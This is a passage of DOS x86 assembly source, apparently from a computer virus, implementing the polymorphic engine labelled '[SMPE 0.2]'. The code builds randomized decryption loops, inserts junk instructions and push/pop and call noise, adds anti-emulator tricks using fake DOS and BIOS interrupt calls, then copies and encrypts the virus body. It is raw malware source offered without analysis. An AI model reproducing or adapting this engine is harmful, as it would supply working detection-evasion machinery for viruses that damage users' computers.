           mov     al,23h
   second_operand:
           stosb
           mov     al,0c0h                         ; AND counter,counter
           mov     cl,byte ptr ds:[count_reg]
           add     al,cl
           call    instr_change
           stosb
   direct_ncmp:
           call    do_random_dx_0f
           mov     cl,al                           ; random in cl
           mov     ax,di
           inc     ax
           sub     ax,word ptr ds:[secphs]         ; check lenght of the jump
           not     ax                              ; of the decryption loop
           ror     cl,1
           jc      must_be_long
           cmp     ax,0ff83h
           jae     do_short_jump

   must_be_long:
           sub     ax,03h                          ; for the jz forward

           push    ax
           mov     ax,0374h                        ; JZ=JE away
           cmp     byte ptr ds:[can_doda],00h
           je      ok_stojz
           ror     cl,1
           jc      ok_stojz
           inc     al                              ; put JBE
           inc     al
   ok_stojz:
           stosw
           mov     al,0e9h                         ; JMP
           stosb
           pop     ax

           jmp     end_bjump

   do_short_jump:
           cmp     byte ptr es:[di-1],049h         ; is a DEC CX ?
           jne     normal_short_jump
           ror     cl,1
           jc      normal_short_jump
           dec     di                              ; overwrite the dec cx
           dec     al                              ; jump bytes
           mov     ah,0e2h                         ; LOOP
           jmp     xchnstr

   normal_short_jump:
           mov     ah,75h                          ; JNE=JNZ back
           cmp     byte ptr ds:[can_doda],00h
           je      xchnstr
           ror     cl,1
           jnc     xchnstr
           inc     ah
           inc     ah
   xchnstr:
           xchg    ah,al

   end_bjump:
           stosw
           mov     ax,01h
           mov     byte ptr ds:[ds_mody],al        ; we can again change DS
           dec     ax
           dec     ax
           mov     word ptr ds:[count_reg],ax      ; we can now use all regs

           call    do_garbage                      ; put some more garbage

           cmp     byte ptr ds:[inverse],01h
           jne     no_more_needed

           call    do_garbage                      ; expecially if we encrypted
           call    do_garbage                      ; from end to begin - prefetch

   no_more_needed:

           mov     ax,bp

           mov     si,word ptr ds:[pointer_di]     ; calculate pointer on code
           add     ax,di
           cmp     byte ptr ds:[inverse],01h
           jne     lets_cont
           add     ax,word ptr ds:[enc_lenght]
           dec     ax
           dec     ax
   lets_cont:
           mov     word ptr es:[si],ax             ; store pointer on code
           sub     ax,bp

   ;; Decryptor building end

           mov     cx,word ptr ds:[enc_lenght]

           push    cx

           cmp     byte ptr ds:[isword],00h        ; convert lenght in words
           je      go_for_it
           inc     cx
           shr     cx,1
   go_for_it:

           mov     si,word ptr ds:[counter_pos]
           mov     word ptr es:[si],cx             ; store lenght

           pop     cx
           mov     dx,cx

           pop     si
           pop     ds
           pop     cx

   ; Copy code and encrypt it
           push    di
           rep     movsb                             ; copy the virus after
           pop     di

           push    ax
           push    ds
           push    es
           pop     ds
           add     di,offset virus_normal_encrypt_start
           mov     ax,crypt_size/2
           call    enc_dec_smpe                     ; encrypt with the xor
           pop     ds
           pop     ax

           mov     si,ax
           push    ax
           cmp     byte ptr ds:[inverse],01h
           jne     no_decrement_ndd
           mov     byte ptr ds:[first_inc],4eh     ; dec si
   no_decrement_ndd:
           cmp     byte ptr ds:[isrolror],00h        ; are we rol(r)ling?
           je      noro
           mov     byte ptr ds:[enc_loop],0d2h       ; first byte for ror/rol
           mov     byte ptr ds:[random_value],90h  ; no random value req
           cmp     byte ptr ds:[isrolror],02h

   noro:
           cmp     byte ptr ds:[isword],00h  ; word operations?
           je      pre_enc_loop_one
           mov     ax,dx
           inc     ax
           shr     ax,1
           mov     dx,ax                     ; calculate lenght in words
           inc     byte ptr ds:[enc_loop]    ; put word working opcode
           mov     cl,46h
           cmp     byte ptr ds:[inverse],01h
           jne     ok_no_cl_ch
           add     cl,08h
   ok_no_cl_ch:
           mov     byte ptr ds:[second_inc],cl   ; put another inc
   pre_enc_loop_one:
           db      0b1h                    ; mov cl,
   cl_move db      00h                     ; immediate

           push    es                      ; DS to what we must encrypt
           pop     ds

           jmp     enc_loop                ; cpus rules 4 prefetch

   do_inc_pointer:
           call    randomshit              ; some foo instructions
           mov     al,040h                 ; pointer increment
           cmp     byte ptr ds:[inverse],00h
           je      no_decrement
           add     al,08h                  ; dec base
   no_decrement:
           add     al,byte ptr ds:[point_reg]
           stosb
           ret

   randomshit:
           mov     bx,0fh
           mov     dx,bx
           call    do_random                       ; how much shit
           cmp     al,00h
           je      randomshit
           mov     cl,al
           sub     ch,ch
           call    do_the_random                   ; do shit
           ret

   enc_loop:
   ;        xor     byte ptr ds:[si],immediate
                   db      080h
                   db      034h            ; real poly encryption
   random_value    db      090h
                   db      90h             ; random value2

   first_inc       db      46h             ; inc si
   second_inc      db      90h             ; space for second inc si

           dec     dx
           jnz     enc_loop

           pop     ax

           cmp     byte ptr cs:[inverse],00h       ; from end?
           je      normali
           inc     ax                              ; adjust lenght
           inc     ax
           mov     di,ax
           jmp     after_it
   normali:
           mov     di,si
   after_it:

           sub     dx,dx                           ; ds:dx = generated code
           mov     cx,di                           ; cx=di=lenght

           call    add_to_cx

           pop     bx

           push    ds
           pop     es

           mov     ah,49h
           call    do_original_21h                 ; deallocate the mem for poly
                                                   ; ES still on virus code,
                                                   ; but now it isn't allocated
                                                   ; any more
           push    cs
           pop     ds
           jmp     enc_dec_smpe_engine             ; encrypt poly and exit

   poly_name       db      '[SMPE 0.2]'

   add_to_cx:
           in      ax,40h
           and     ax,0111111b                     ; add up to 63 bytes to
           add     cx,ax                           ; the lenght in CX
           ret

   do_garbage:

           mov     bx,1fh                  ; max number of garbage i.
           mov     dx,bx
   pung:
           call    do_random       ; how much instructions
           cmp     al,00h
           je      pung            ; no 0 instruction allowed!
           mov     cl,al
           sub     ch,ch           ; CX = number of instructions to generate

   do_the_random:
           mov     dx,07                           ; used for the random gen
           mov     bx,dx
           call    do_random
           cmp     al,04h                          ; no SP allowed
           je      do_the_random
           cmp     al,byte ptr ds:[count_reg]      ; don't change the counter
           je      do_the_random
           cmp     al,byte ptr ds:[point_reg]      ; don't change the pointer
           je      do_the_random
           cmp     al,byte ptr ds:[nocx]           ; no CX change if used
           je      do_the_random
           xchg    ah,al
           mov     byte ptr ds:[reg8bits],0        ; reset 8 bit marker
           call    select_instruction              ; generate the instuction
           loop    do_the_random                   ; with the selected reg.
           ret

   select_instruction:
           push    cx                              ; AH = destination register
           push    ax
           mov     si,offset instructions
   redorndin:
           mov     bx,0ah               ; 0Ah basic types of instructions
           mov     dx,0fh               ; don't eliminate some
           call    do_random            ; which instruction will we generate
           cmp     al,byte ptr ds:[last_done]      ; try to change sometime
           je      redorndin
   continue:
           mov     byte ptr ds:[last_done],al      ; store type
           add     si,ax                   ; point to the instr. in the table
           cmp     al,1                    ; which instruction
           ja      foo_label
           jmp     one_byte_instruction

   foo_label:
           cmp     al,7
           jb      no_3b
           jmp     three_bytes_instruction
   no_3b:
           cmp     al,2                    ; which instruction
           je      outta_here
           cmp     al,4
           jne     foo_label_2
           jmp     not_nop
   foo_label_2:
           cmp     al,5
           jb      outta_here
           jmp     rolling
   outta_here:
           mov     al,byte ptr ds:[si]
           jae     finish_mate
           push    ax
   calltheran:
           call    do_random_dx_0f
           mov     cl,al
           cmp     cl,7                            ; is a compare?
           jne     end_cmp_check
           mov     byte ptr ds:[cmp_check],1       ; sign it.
   end_cmp_check:
           pop     ax
           call    instr_change

   finish_mate:
           stosb                           ; instruction base oc
           call    do_random_dx_0f
           mov     cl,al
           pop     ax
           mov     al,0c0h                 ; op code for reg+instr
           cmp     ah,04
           jae     only16
           push    ax
           call    do_random_dx_0f         ; reg16 or reg8
           mov     ch,al
           pop     ax
           ror     ch,1
           jc      only16
           dec     byte ptr es:[di-1]      ; bytes opcode = word opcode-1
           ror     ch,1
           jnc     only16
           add     al,20h                  ; high 8 bits
           jmp     end_8_bts
   only16:
           cmp     byte ptr es:[di-1],08bh ; only if moving
           jne     finishing_mate

           cmp     byte ptr ds:[ds_mody],00h
           je      check_for_es_change
           push    ax
           call    do_random_dx_0f
           cmp     al,02h
           pop     ax
           ja      check_for_es_change
           add     byte ptr es:[di-1],03h
           mov     ah,3                    ; ds has eq second opcode as bx
           jmp     end_8_bts
   check_for_es_change:
           cmp     byte ptr ds:[es_mody],00h
           je      end_8_bts
           push    ax
           call    do_random_dx_0f
           cmp     al,05h
           pop     ax
           jb      end_8_bts
           add     byte ptr es:[di-1],03h
           sub     ah,ah                   ; es has eq second opcode as ax
           jmp     end_8_bts

   finishing_mate:
           push    ax
           call    do_random_dx_0f
           cmp     al,06h
           pop     ax
           jb      end_8_bts
           mov     al,06h
           stosb
           mov     byte ptr ds:[reg8bits],00h
           jmp     gen_mpos
   end_8_bts:
           add     al,cl
           mov     cl,ah
           call    instr_change
   stor_chkjmp:
           stosb
           cmp     word ptr ds:[cmp_check],0001    ; encountered a cmp?
           jne     not_comparing                   ; but out of a jmp region?
           call    jumping_zone                    ; no, so do one
   not_comparing:
           pop     cx
           ret

   one_byte_instruction:
           pop     ax
           mov     al,byte ptr ds:[si]             ; dec/inc generation
           add     al,ah
           stosb
           mov     cl,ah
           call    do_random_dx_0f
           mov     ah,cl
           cmp     al,07h                          ; INT 21h generation?
           jb      nocd21
           call    generate_int
           jmp     no_ah_disp
   nocd21:
           mov     cl,06h
           cmp     al,cl
           jb      no_ah_disp
           call    do_antiemulator
   no_ah_disp:
           cmp     byte ptr ds:[emu_trick],00h
           je      go_away_now

           in      al,40h
           shr     al,1
           jc      no_cd20
           shr     al,1
           jc      only_a_ret
           mov     ax,20cdh
           jmp     short stor_n_go
   only_a_ret:
           mov     al,0c3h
           stosb
           jmp     short exit_exit_put
   no_cd20:
           shr     al,1
           jc      with_el
           mov     ax,4cb4h                        ; mov ah,4ch
           jmp     short sto21_n_go
   with_el:
           mov     al,0b8h
           stosb
           in      al,40h                          ; random retrun code
           mov     ah,4ch                          ; mov ax,4cxxh
   sto21_n_go:
           stosw
           mov     ax,21cdh                        ; int 21h
   stor_n_go:
           stosw
   exit_exit_put:
           mov     byte ptr ds:[emu_trick],00h
   go_away_now:
           pop     cx
           ret

   not_nop:
           mov     al,0f7h                         ; not/neg
           stosb
           call    do_random_dx_0f
           mov     cl,al
           pop     ax
           push    cx
           mov     al,byte ptr ds:[si]             ; basic opcode
           add     al,ah                           ; register dependant
           shr     cl,1
           jc      isneg
           add     al,08h                          ; change to not
   isneg:
           pop     cx
           cmp     byte ptr ds:[push_nr],2         ; max pushes nested
           ja      nopush
           cmp     cl,2
           ja      nopush
           jmp     dopushpop                       ; do push
   nopush:
           stosb
           pop     cx
           ret

   rolling:
           mov     al,byte ptr ds:[si]
           stosb                           ; rol/ror... base oc
           mov     al,0c0h
           call    do_random_dx_0f
           mov     cl,al
           pop     ax
           cmp     cl,06h
           jne     no_increment
           inc     cl
   no_increment:
           mov     al,0c0h                 ; the base
           call    conv16to8               ; 8 or 16 bit instruction?
           add     al,ah
           call    instr_change
           stosb                           ; write the reg/op dipendant byte
           pop     cx
           ret

   three_bytes_instruction:
           cmp     al,8                    ;mov reg,immediate
           je      doalea
           cmp     al,9                    ;mov reg,[imm]
           je      domemcp
           cmp     al,0ah
           je      do_real_lea
           mov     al,083h                 ; write the fixed first byte
           stosb
   reget:
           call    do_random_dx_0f         ; select which 3 bytes to do
           mov     cl,al
           cmp     cl,7
           jne     end_cmp_imm_check
           mov     byte ptr ds:[cmp_check],1
           jmp     short end_cmp_imm_check

   do_compare:
           push    cx
           call    do_random_dx_0f
           cmp     ah,04h
           je      do_compare
           push    ax
           mov     al,83h
           stosb
           mov     cl,7
           mov     al,0c0h
           jmp     short jch_npt

   end_cmp_imm_check:
           mov     al,byte ptr ds:[si]
   jch_npt:
           call    instr_change            ; generate instruction
           mov     bl,al
           pop     ax
           mov     al,bl
           call    conv16to8               ; 16 or 8 bit instruction?
           add     al,ah
           stosb
           mov     bx,0ffh                 ; select the random immediate
           mov     dx,bx
           call    do_random
           jmp     stor_chkjmp             ; check for cmp and store

   doalea:
           mov     cl,0b8h
           pop     ax
           cmp     ah,4                    ; may we create a 8 bit mov?
           jae     mov16breg               ; yeah, so select randomly which
           push    ax
           in      al,40h
           ror     al,1
           jnc     dowith16b
           mov     byte ptr ds:[reg8bits],1
           mov     cl,0b0h                 ; mov reg8_low,imm
           ror     al,1
           jnc     dowith16b
           add     cl,4                    ; high 8 bits
   dowith16b:
           pop     ax
   mov16breg:
           mov     al,cl
           add     al,ah
           stosb                           ; mov reg,immediate
           jmp     gen_mpos

   do_real_lea:
           mov     al,08dh                 ; store first lea byte
           stosb
           pop     ax                      ; ah = used register
           mov     cl,ah
           mov     al,06h
           call    instr_change
           stosb
           jmp     gen_mpos

   domemcp:
           in      al,40h                  ; select segment
           shr     al,1
           jnc     no_seg_change           ; nc? only DS:
           shr     al,1
           jc      change_to_cs            ; c? put CS:
           mov     al,026h                 ; nc? put ES:
           stosb
           jmp     no_seg_change
   change_to_cs:
           mov     al,02eh                 ; CS:
           stosb
   no_seg_change:
           mov     al,08bh
           stosb                           ; mov reg,seg:[imm]
           pop     ax
           mov     cl,ah

           mov     al,06h
           call    instr_change
           stosb

   gen_mpos:
           mov     bx,07fffh                 ;select immediate
           mov     dx,bx
           call    do_random
           stosb
           xchg    al,ah
           cmp     byte ptr ds:[reg8bits],1
           je      no_2_imms               ; was an 8 bit instruction?
           stosb
   no_2_imms:
           pop     cx
           ret

   do_random_dx_0f:
           mov     bx,07h
           mov     dx,bx
   do_random:
           call    real_random
           cmp     al,byte ptr ds:[last_random]    ; equal as last used?
           jne     isokrandom
           call    real_random
   isokrandom:
           mov     byte ptr ds:[last_random],al
           ret

   last_random     db      0ffh

   real_random:
           in      al,40h
           mov     ah,al
           in      al,40h
           ror     al,2
           xor     al,ah
           and     ax,dx
           cmp     ax,bx
           ja      real_random
   end_real_random:
           ret

   instr_change:
           cmp     cl,00h                  ; generate new instruction
           je      finish_instr_change     ; based on input register.
           add     al,08h
           dec     cl
           jmp     instr_change
   finish_instr_change:
           ret

   conv16to8:
           cmp     ah,4
           jae     avante                  ; only from ax to dx
           push    ax
           call    do_random_dx_0f
           mov     ch,al
           ror     ch,1
           pop     ax
           jnc     avante                  ; do 8 or 16?
           sub     byte ptr es:[di-1],1
           ror     ch,1
           jnc     avante
           add     al,04                   ; low 8 bits or high 8?
   avante:
           ret

   int10_16:
           cmp     ch,0ch
           ja      no_get_cpos
           mov     ah,03h                  ; Get cursor position
           jmp     store_int_10
   no_get_cpos:
           cmp     ch,0dh
           ja      no_int10
           mov     ah,0fh                  ; Get current video mode
           jmp     store_int_10
   no_int10:
           cmp     ch,0eh
           ja      no_get_keystroke
           mov     ah,01h                  ; Get Keystroke
           push    ax
           in      al,40h
           rol     al,1
           pop     ax
           jc      store_int_16
           inc     ah                      ; Get shift states
           jmp     store_int_16
   no_get_keystroke:
           mov     ah,09h                  ; Get KBD functionality
           push    ax
           in      al,40h
           mov     cl,al
           rol     cl,1
           pop     ax
           jc      store_int_16
           inc     ah                      ; get KBD id
           rol     cl,1
           jc      store_int_16
           add     ah,07h                  ; check for keystroke
   store_int_16:
           stosw
           mov     ax,16cdh                ; int 16h
           jmp     sto_n_xit
   store_int_10:
           stosw
           mov     ax,10cdh                ; int 10h
   sto_n_xit:
           stosw
           jmp     look_4_int_jmp


   generate_int:
   doint:
           dec     di
           mov     bx,0fh
           mov     dx,bx
           call    do_random
           mov     ch,al                           ; rnd in ch
           mov     al,0b4h                         ; MOV ah,
           cmp     byte ptr ds:[nocx],01h
           je      go_on_ah
           cmp     byte ptr ds:[count_reg],02h
           jbe     go_on_ah                        ; togli se non usi AX x cnt
           cmp     byte ptr ds:[count_reg],03h     ; is BX as counter?
           je      lamah_jump
           cmp     byte ptr ds:[point_reg],03h     ; is BX as pointer?
   lamah_jump:
           je      intwithacd                      ; those with AX,CX,DX
           cmp     ch,1
           jbe     es_bx_oper
           cmp     ch,0ch
           jae     int10_16
           cmp     ch,0bh
           jae     es_bx_oper
           cmp     ch,4
           jbe     intwithacd
           cmp     ch,6
           jbe     go_on_ah
           cmp     ch,9
           ja      allocmem
           cmp     ch,7
           je      getpsp
           mov     ah,30h                          ; dos version
           jmp     storeandint
   go_on_ah:
           jmp     onlyahint
   es_bx_oper:
           cmp     byte ptr ds:[es_mody],00h
           je      no_es_modify
           cmp     ch,0bh
           jb      no_get_dta
           ja      get_indos_flag
           mov     ah,02fh                         ; get dta
           jmp     storeandint
   get_indos_flag:
           mov     ah,034h
           jmp     storeandint                     ; get address indos flag
   no_get_dta:
           cmp     ch,00h
           je      getintvec
           mov     ah,52h                          ; get list of the lists
           jmp     storeandint
   getintvec:
           mov     ah,35h                          ; getintvec
           jmp     storeandint
   no_es_modify:
           cmp     ch,0bh
           je      space_stuff
           cmp     ch,00h
           je      another_one
           mov     ah,51h                          ; get psp adress
           jmp     storeandint
   space_stuff:
           mov     ah,36h                          ; get free disk space C:
           stosw
           mov     ax,03b2h                         ; mov dl,03
           jmp     storeandint
   another_one:
           mov     al,0b8h
           stosb
           mov     ax,6601h                        ; get codepage
           jmp     storeandint
   getpsp:
           mov     ah,62h                          ; get psp
           jmp     storeandint
   intwithacd:
           cmp     ch,3
           jae     getbdrive
           mov     ah,06h                          ; ah=06h
           stosw
           mov     al,0b2h                         ; mov dl
           mov     ah,0ffh                         ; ffh
           jmp     storeandint
   allocmem:
           mov     ah,48h                          ; allocate mem
           stosw
           mov     al,0bbh                         ; in bx max mem avaiable
           stosb
           sub     ax,ax
           dec     ax                              ; bx=ffffh
           jmp     storeandint
   getbdrive:
           mov     al,0b8h
           stosb
           mov     ax,3305h
           cmp     ch,4
           je      storeandint
           sub     al,al
           mov     ah,058h
           jmp     storeandint
   onlyahint:
           mov     bx,02h
           mov     dx,03h
           push    ax
           call    do_random
           mov     ch,al
           pop     ax
   okah:
           cmp     ch,1
           je      getcdrive
           cmp     ch,2
           je      getveryfl
           mov     ah,0bh                          ; get stdin status
           jmp     storeandint
   getveryfl:
           mov     ah,054h                         ; get verify flag
           jmp     storeandint
   getcdrive:
           mov     ah,019h                         ; get default drive
   storeandint:
           stosw
           mov     ax,021cdh                       ; int 21h
           stosw
   look_4_int_jmp:
           cmp     byte ptr ds:[cmp_check],1
           je      icantint
           in      al,40h
           rol     al,1
           jc      icantint
           mov     byte ptr ds:[cmp_check],1
           call    do_compare
   icantint:
           ret

   dopushpop:
           dec     di
           inc     byte ptr ds:[push_nr]   ; increment the numba of pushes
           push    ax

           mov     bx,0ah
           mov     dx,0fh
           call    do_random

           xchg    al,ah

           cmp     ah,08h
           jb      no_segment_push
           mov     al,06h                  ; push es
           cmp     ah,08h
           je      add_n_store
           add     al,08h                  ; push cs
           cmp     ah,09h
           je      add_n_store
           add     al,10h                  ; push ds
           jmp     short add_n_store
   no_segment_push:
           mov     al,50h                  ; push a reg
           add     al,ah
   add_n_store:
           stosb
           call    random_foo_instructions ; some shit between

           call    do_random_dx_0f

           cmp     al,06h
           pop     ax
           jb      no_pop_segment

           mov     al,07h                  ; pop es
           cmp     byte ptr ds:[es_mody],00h
           je      try_pop_ds
           push    ax
           in      al,40h                  ; cdanncaddacnjdcanjndca
           ror     al,1
           pop     ax
           jc      store_pop
   try_pop_ds:
           add     al,18h                  ; pop ds
           cmp     byte ptr ds:[ds_mody],00h
           jne     store_pop
   no_pop_segment:
           mov     al,58h                  ; pop with the selected one
           add     al,ah
   store_pop:
           stosb
           pop     cx
           dec     byte ptr ds:[push_nr]   ; number of pushes curr. active
           ret

   jumping_zone:
           mov     byte ptr ds:[cmp_check2],1      ; lock jumping
           mov     bx,06h
           mov     dx,07h
           call    do_random
           cmp     al,06h
           jne     conditional_jump
   jump_short_crea:
           mov     al,0ebh                         ; jmp short
           jmp     store_jump
   conditional_jump:
           mov     ah,al                           ; jmp type
           mov     al,72h                          ; jmp base
           add     al,ah
   store_jump:
           stosb                                   ; write jmp
   retry_cond_jump:
           push    di
           stosb                                   ; where will jump
           call    random_foo_instructions
           mov     ax,di
           pop     di
           push    ax
           sub     ax,di
           dec     ax
           cmp     ax,7fh
           jbe     ok_lenght_jump
           pop     ax
           jmp     retry_cond_jump
   ok_lenght_jump:
           stosb                                   ; put the bytes to jump
           pop     di
           mov     byte ptr ds:[cmp_check],0       ; reset both checks
           mov     byte ptr ds:[cmp_check2],0
           ret

   random_foo_instructions:
           call    do_random_dx_0f         ; how much foo
           cmp     al,0
           je      random_foo_instructions
           cmp     byte ptr ds:[emu_trick],01h
           jne     no_Adding
           inc     al
           inc     al

   no_Adding:
           mov     cl,al
           sub     ch,ch
           call    do_the_random           ; generate foo instructions
           ret

   ob_oc   db      98h,0f8h,0cch,0f9h,0fch,0fdh,0f5h,0cch  ; one byters

   one_byters:
           call    do_random_dx_0f
           sub     ah,ah
           mov     bx,offset ob_oc
           add     bx,ax
           mov     al,byte ptr ds:[bx]
           stosb
           ret

   do_antiemulator:
           cmp     byte ptr ds:[cmp_check2],01h
           jne     cont_antiemu
           jmp     end_antiemu

   cont_antiemu:
           mov     cl,ah
           call    do_random_dx_0f
           mov     ah,cl
           cmp     al,02h
           je      get_bdrive
           cmp     byte ptr ds:[nocx],01h
           je      cant_use
           cmp     byte ptr ds:[count_reg],01h ; cx
           jne     canuse
   cant_use:
           jmp     end_antiemu
   canuse:
           cmp     al,01h
           je      get_dos_ver
           cmp     al,06h
           jae     set_wrong_time
           cmp     al,03h
           je      one_byters
           jmp     do_a_call

   set_wrong_time:
           cmp     al,06h
           je      withcl
           mov     ah,0b5h                 ; mov ch,
           mov     dl,19h
           jmp     short get_rnd_tset
   withcl:
           mov     ah,0b1h                 ; mov cl,
           mov     dl,03dh
   get_rnd_tset:
           in      al,40h
           cmp     al,dl
           jb      get_rnd_tset
           xchg    al,ah                   ; store the mov
           stosw

           mov     byte ptr ds:[nocx],01h  ; enable no cx change
           call    random_foo_instructions ; garbage instructions
           mov     byte ptr ds:[nocx],0ffh ; enable cx changing
           mov     ax,2db4h                ; mov ah,2dh
           stosw
           xor     dl,dl                   ; test al
           xor     dh,dh                   ; compare with 0
           mov     cl,03h                  ; jne
           jmp     store_and_jump



   get_dos_ver:
           cmp     byte ptr ds:[count_reg],03h ; bx
           je      end_antiemu
           cmp     byte ptr ds:[point_reg],03h
           je      end_antiemu

           mov     ax,30b4h                ; get dos version
           stosw
           mov     cl,01h                  ; JAE
           in      al,40h
           ror     al,1
           jc      ok_this
           add     cl,04h                  ; JA
   ok_this:
           and     al,011b                 ; 0 - 3
           mov     dh,al
           xor     dl,dl
           mov     cl,01h
           jmp     store_and_jump

   get_bdrive:
           cmp     byte ptr ds:[count_reg],02h  ; is dx usable?
           je      end_antiemu

           mov     al,0b8h                 ; mov ax,
           stosb
           mov     ax,3305h                ; get boot drive
           stosw
           mov     dl,02h                  ; check DL
           xor     dh,dh                   ; compare with 00h
           mov     cl,03h                  ; JNE

   store_and_jump:
           mov     ax,21cdh                ; int 21h
           stosw
           mov     al,82h                  ; cmp
           stosb
           mov     al,0f8h                 ; cmp base
           add     al,dl                   ; dl contains register
           mov     ah,dh                   ; dh contains value
           stosw
           mov     byte ptr ds:[emu_trick],01h
           mov     byte ptr ds:[cmp_check2],01h
           mov     al,cl                  ; cl contains type of jump
           call    conditional_jump
           mov     byte ptr ds:[emu_trick],00h
           mov     byte ptr ds:[cmp_check2],00h

   end_antiemu:
           ret

   do_a_call:
           push    ax
           mov     al,0e8h                 ; make a CALL
           stosb
           push    di
           stosw
           call    random_foo_instructions ; some shit
           pop     si
           mov     cx,di
           sub     cx,si                   ; calculate offset
           dec     cx
           dec     cx
           mov     word ptr es:[si],cx     ; here we will CALL
           call    random_foo_instructions ; again some shit
           inc     byte ptr ds:[push_nr]
           pop     ax                      ; AH = usable register
           push    cx
           jmp     no_pop_segment          ; pop the IP

   instructions:

   ; the data below this line is of use by the poly to create some of the
   ; various possible operations on registers in the trash generation part

   ;ONE BYTE ONLY
   inc_16       db      040h    ; INC REG16
   dec_16       db      048h    ; DEC REG16
   mov_rr16     db      08bh    ; general first byte
   ; + 0 (03h) ADD
   ; + 8 (0bh) OR
   ; + 10 (13h) ADC
   ; + 18 (1bh) SBB
   ; + 20 (23h) AND
   ; + 28 (2bh) SUB
   ; + 30 (33h) XOR
   ; + 38 (3bh) CMP
   math_rr16    db      03h    ; basic opcode
   not_neg      db      0d0h
   rot_1        db      0d1h    ; ROL/ROR/SHL/SHR/RCR/RCL/SAR/SAL REG16,1
   rot_cl       db      0d3h    ; ROL REG16,CL
   ; +0h (0c0h)     ADD
   ; +8h (0c8h)     OR
   ; +10h (0d0h)    ADC
   ; +18h (0d8h)    SBB
   ; +20h (0e0h)    AND
   ; +28h (0e8h)    SUB
   ; +30h (0f0h)    XOR
   ; +38h (0f8h)    CMP
   add_r16i     db      0c0h    ; ADD REG16,IMMEDIATE 2 byte
   lea_reg      db      0b8h    ; LEA REG16,something

   smpe_encrypted_end:

   ; Poly data start - This will be only in memory!

   poly_data_mem:

   enc_lenght      dw      00h
   last_done       db      00h
   reg8bits        db      00h
   cmp_check       db      00h
   cmp_check2      db      00h
   count_reg       db     0ffh
   point_reg       db     0ffh
   pointer_di      dw      00h
   secphs          dw      00h
   isword          db      00h
   isrolror        db      00h
   push_nr         db      00h
   can_doda        db      00h
   es_mody         db      00h     ; 00 don't modify, 01 can modify
   ds_mody         db      00h     ; 00 don't modify, 01 can modify
   counter_pos     dw      00h
   emu_trick       db      00h
   inverse         db      00h
   nocx            db     0ffh
   seg_sta         db     0ffh
   ; Poly data end

   poly_data_mem_end:
